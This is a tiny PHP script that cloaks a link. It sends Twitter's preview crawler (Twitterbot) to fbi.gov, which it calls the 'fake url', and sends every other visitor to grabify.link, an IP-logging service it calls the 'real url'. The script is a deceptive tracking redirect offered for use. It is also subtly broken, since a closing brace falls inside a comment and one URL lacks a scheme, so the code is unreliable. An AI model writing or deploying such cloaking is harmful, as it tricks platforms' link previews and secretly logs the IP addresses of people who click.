<?php
if (strpos($_SERVER["HTTP_USER_AGENT"], "Twitterbot") !== false) {
 header("location: https://fbi.gov"); // fake url
} else { header("location: grabify.link");// real url } 
?>
